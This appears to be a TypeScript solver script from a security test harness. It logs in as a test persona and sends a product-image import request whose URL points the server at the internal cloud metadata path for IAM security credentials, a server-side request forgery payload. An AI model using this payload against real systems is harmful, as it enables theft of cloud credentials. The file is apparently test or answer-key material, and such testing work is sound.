// Import a product image from a URL that points the server-side fetch at the internal metadata origin.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'
import { METADATA_ORIGIN } from '../../src/internal-services.ts'

interface Product { external_id: string }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const res = await ctx.fetch(buildPath(ctx.plan, 'listProducts'), { method: 'GET' })
  const data = (await res.json().catch(() => ({}))) as { products?: Product[] }
  const product = data.products?.[0]
  if (!product) return
  const srcField = ctx.plan.params['imageUrl'] ?? 'src'
  await ctx.fetch(buildPath(ctx.plan, 'importProductImage', { productId: product.external_id }), {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ [srcField]: `${METADATA_ORIGIN}/latest/meta-data/iam/security-credentials/` }),
  })
}
